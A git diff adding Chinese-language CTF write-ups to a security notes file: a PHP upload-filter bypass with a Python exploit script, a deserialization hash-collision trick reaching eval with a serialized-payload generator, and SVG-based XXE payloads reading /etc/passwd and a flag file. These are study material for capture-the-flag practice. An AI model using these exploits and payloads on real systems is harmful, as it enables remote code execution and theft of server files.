@@ -10216,9 +10216,224 @@ cat payload.xml | iconv -f utf-8 -t utf-16be > payload.8-16be.xml
 </users>
 ```
 
+## [NSSCTF 2nd]php签到
+
+源码：
+
+```php
+<?php
+
+function waf($filename)
+{
+    $black_list = array("ph", "htaccess", "ini");
+    $ext = pathinfo($filename, PATHINFO_EXTENSION);
+    foreach ($black_list as $value) {
+        if (stristr($ext, $value)) {
+            return false;
+        }
+    }
+    return true;
+}
+
+if (isset($_FILES['file'])) {
+    $filename = urldecode($_FILES['file']['name']);
+    $content = file_get_contents($_FILES['file']['tmp_name']);
+    if (waf($filename)) {
+        file_put_contents($filename, $content);
+    } else {
+        echo "Please re-upload";
+    }
+} else {
+    highlight_file(__FILE__);
+}
+```
+
+结果还是被难道了~，试过了apache解析漏洞，`%00`截断都不行（以为关键点就在`urldecode`中的）；
+
+文件名为`xxx.php/.`时`file_get_contents()`会将`/.`删掉，刚好最后一个`.`也绕过了waf。
+
+```php
+<?php
+// 最后生成文件为 test.txt
+file_put_contents("test.txt/.", '1223');
+```
+
+POC：
+
+```py
+import requests
+
+url = 'http://node5.anna.nssctf.cn:29115/'
+
+# shell.txt 内容为要写入的PHP文件内容
+upload_file = {'file': ("info.php%2F.", open('shell.txt', 'rb'))}
+response = requests.post(url, files=upload_file)
+print(response.text)
+```
+
+## BUUOJ [极客大挑战 2020]Greatphp
+
+> 参考：https://blog.csdn.net/qq_63701832/article/details/131166789
+>
+> ​		   https://blog.csdn.net/LYJ20010728/article/details/117429054
+
+```php
+<?php
+error_reporting(0);
+class SYCLOVER {
+    public $syc;
+    public $lover;
+
+    public function __wakeup(){
+        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
+           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
+               eval($this->syc);
+           } else {
+               die("Try Hard !!");
+           }
+           
+        }
+    }
+}
+
+if (isset($_GET['great'])){
+    unserialize($_GET['great']);
+} else {
+    highlight_file(__FILE__);
+}
+
+?>
+```
+
+经典一看很简单，一做wc~
+
+首先哈希函数这里是不可以用数组绕过的，因为`eval()`直接传入一个数组会报错，所以需要使用PHP内酯类Exception 类与 Error（Exception 类与 Error 的使用和结果完全一样，只不过 Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7）
+
+hash函数和`eval()`函数都会触发类的`__tostring()`方法，我们可以使用含有 __toString 方法的PHP内置类来绕过，用的两个比较多的内置类就是 Exception 和 Error ，他们之中有一个 __toString 方法，当类被当做字符串处理时，就会调用这个函数，以Error 类为例，我们来看看当触发他的 __toString 方法时会发生什么：
+
+![image-20240521184224535](CTF.assets/image-20240521184224535.png)
+
+**这里必须保证$a和$b的在同一行，这样回显出的错误行号才能一样**，由于它们本身是不同的对象，但回显的东西又一样，就可以成功绕过哈希函数
+
+第二个if判断这里，由于屏蔽了括号和引号，所以使用取反绕过，前面的`?>`是为了闭合题目中PHP的前缀`<?php`，否则会报错
+
+```php
+<?php
+eval("?><?=include ~".urldecode('%D0%99%93%9E%98').";?>");
+```
+
+![image-20240521184741728](CTF.assets/image-20240521184741728.png)
+
+POC：
+
+```php
+<?php
+
+//error_reporting(0);
+class SYCLOVER
+{
+    public $syc;
+    public $lover;
+
+    public function __wakeup()
+    {
+        echo "反序列化开始";
+        var_dump($this->syc != $this->lover);
+        var_dump(md5($this->syc) === md5($this->lover));
+
+        if (($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc) === sha1($this->lover))) {
+            echo "哈希绕过成功";
+            if (!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)) {
+                eval($this->syc);
+            } else {
+                die("Try Hard !!");
+            }
+
+        }
+    }
+}
+
+$c = new SYCLOVER();
+$str = "?><?=include ~".urldecode('%D0%99%93%9E%98').";?>";
+$a = new Error($str, 1);$b = new Error($str, 2);
+$c->syc = $a;
+$c->lover = $b;
+$ser = serialize($c);
+echo urlencode($ser);
+```
+
+## BUUOJ [BSidesCF 2019]SVGMagic
+
+> 参考：https://blog.csdn.net/qq_38154820/article/details/110152943
+
+### SVG 简介
+
+SVG，可缩放矢量图形（Scalable Vector Graphics），是一种用于描述二维图形的 XML 标记语言。
+
+与位图图像不同，SVG 图像以文本形式存储，并且可以缩放到任意大小而不会失真，因为它们基于数学描述而不是像素。
+
+### 什么是SVG？
+
+- SVG 指可伸缩矢量图形 (Scalable Vector Graphics)
+- SVG 用来定义用于网络的基于矢量的图形
+- SVG 使用 XML 格式定义图形
+- SVG 图像在放大或改变尺寸的情况下其图形质量不会有所损失
+- SVG 是万维网联盟的标准
+- SVG 与诸如 DOM 和 XSL 之类的 W3C 标准是一个整体
+
+以下是一个简单的 SVG 文件示例，创建一个包含一个圆形的 SVG 图像：
+
+```
+<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+  <circle cx="100" cy="100" r="80" fill="blue" />
+</svg>
+```
+
+这段代码描述了一个 SVG 画布，宽度为 200 个单位，高度也为 200 个单位。在画布上绘制了一个圆形，圆心坐标为(100, 100)，半径为80个单位，填充颜色为蓝色。
+
+![image-20240521191759689](CTF.assets/image-20240521191759689.png)
+
+![image-20240521191252438](CTF.assets/image-20240521191252438.png)
+
+进来看到一个上传口，尝试上传php后缀或者jpg后缀文件都发现服务器报错。推断是内部代码出错导致的，那么这里就只能上传SVG文件了
+
+可以看看上面的参考链接**：总结就是SVG遵循了JS和XML的语法，那么就可以做XSS攻击和XXE攻击**
+
+我们直接读取/etc/passwd试一下：
+
+ ```xml
+ <?xml version="1.0" encoding="UTF-8"?>
+ <!DOCTYPE note [
+ <!ENTITY file SYSTEM "file:///etc/passwd" >
+ ]>
+ <svg height="100" width="1000">
+   <text x="10" y="20">&file;</text>
+ </svg>
+ ```
 
 
+我们把上面这段代码保存为1.svg，并上传。
 
+![img](CTF.assets/format,png.png)
+
+可以发现成功回显了带有/etc/passwd内容的图片，但是图像太小，无法容纳所有内容，这里我们可以调整他的width宽度，调大一点就可以看到所有的内容了。
+
+还有个问题就是我们并不知道flag的路径，而/proc/self/pwd/代表的是当前路径，可以构造/proc/self/pwd/flag.txt读取文件。
+
+最后payload如下：
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE note [
+<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
+]>
+<svg height="100" width="1000">
+  <text x="10" y="20">&file;</text>
+</svg>
+我们保存为2.svg上传，发现成功读取到flag。
+```
+
+![img](CTF.assets/format,png-17162903931293.png)
 
 # Misc
 
